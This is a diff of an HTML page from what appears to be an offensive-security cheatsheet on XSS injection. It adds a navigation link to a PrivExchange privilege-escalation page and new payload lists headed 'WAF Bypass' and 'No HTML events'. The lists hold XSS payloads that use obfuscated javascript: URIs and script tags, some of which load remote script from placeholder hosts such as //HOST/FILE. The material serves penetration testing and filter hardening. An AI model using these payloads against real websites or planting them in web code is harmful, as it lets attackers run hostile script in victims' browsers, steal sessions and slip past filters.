@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-11-01T16:53:25 CET">
+<meta name="revised" content="2019-11-10T13:28:46 CET">
 <title>XSS Injections :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1021,6 +1021,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/windows-systems/privilege-escalation/privexchange/" class="dd-item">
+        <div>
+          <a href="/windows-systems/privilege-escalation/privexchange/">
+            PrivExchange
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/post-exploitation-techniques/" class="dd-item haschildren
@@ -1444,7 +1451,25 @@ injecting inside of input tags
 <span style="color:#111">&lt;</span><span style="color:#f92672">input</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#75af00">onfocus</span><span style="color:#f92672">=</span><span style="color:#d88200">alert(0)</span> <span style="color:#75af00">autofocus</span><span style="color:#111">&gt;</span>
 <span style="color:#111">&lt;</span><span style="color:#f92672">input</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#75af00">onfocus</span><span style="color:#f92672">=</span><span style="color:#d88200">alert`0`</span> <span style="color:#75af00">autofocus</span><span style="color:#111">&gt;</span>
 <span style="color:#111">&lt;</span><span style="color:#f92672">input</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#75af00">onfocus</span><span style="color:#f92672">=</span><span style="color:#d88200">prompt`0`</span> <span style="color:#75af00">autofocus</span><span style="color:#111">&gt;</span>
-1&#39;&#34;&gt;<span style="color:#111">&lt;</span><span style="color:#f92672">input</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#75af00">onfocus</span><span style="color:#f92672">=</span><span style="color:#d88200">{alert`1`}</span> <span style="color:#75af00">autofocus</span><span style="color:#111">&gt;</span> </code></pre></div>
+1&#39;&#34;&gt;<span style="color:#111">&lt;</span><span style="color:#f92672">input</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#75af00">onfocus</span><span style="color:#f92672">=</span><span style="color:#d88200">{alert`1`}</span> <span style="color:#75af00">autofocus</span><span style="color:#111">&gt;</span> </code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"># WAF Bypass
+&#39;&#39;;!--&#34;<span style="color:#111">&lt;</span><span style="color:#f92672">XSS</span><span style="color:#111">&gt;</span>=<span style="color:#960050;background-color:#1e0010">&amp;</span>{()}
+<span style="color:#111">&lt;</span><span style="color:#f92672">IMG</span> <span style="color:#75af00">SRC</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;javascript:alert(&#39;XSS&#39;);&#34;</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">IMG</span> <span style="color:#75af00">SRC</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;jav&amp;#x09;ascript:alert(&#39;XSS&#39;);&#34;</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">IMG</span> <span style="color:#75af00">SRC</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;jav&amp;#x0A;ascript:alert(&#39;XSS&#39;);&#34;</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">IMG</span> <span style="color:#75af00">SRC</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;jav&amp;#x0D;ascript:alert(&#39;XSS&#39;);&#34;</span><span style="color:#111">&gt;</span>
+<span style="color:#111">&lt;</span><span style="color:#f92672">INPUT</span> <span style="color:#75af00">TYPE</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;IMAGE&#34;</span> <span style="color:#75af00">SRC</span><span style="color:#f92672">=</span><span style="color:#d88200">&#34;javascript:alert(&#39;XSS&#39;);&#34;</span><span style="color:#111">&gt;</span>
+
+
+# No HTML events
+<span style="color:#111">&lt;</span><span style="color:#f92672">script</span><span style="color:#111">&gt;</span><span style="color:#960050;background-color:#1e0010">alert(1)//
+</span><span style="color:#960050;background-color:#1e0010">&lt;script&gt;alert(1)&lt;!--
+</span><span style="color:#960050;background-color:#1e0010">&lt;script&gt;alert(1)%0A--&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;script src=data:,alert(1)&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;script src=//HOST/FILE&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;script src=https:DOMAIN/FILE&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;svg&gt;&lt;script xlink:href=//HOST/FILE&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;svg&gt;&lt;script xlink:href=https:DOMAIN/FILE&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;svg&gt;&lt;script xlink:href=data:,alert(1)&gt;</span></code></pre></div>
 
     
     
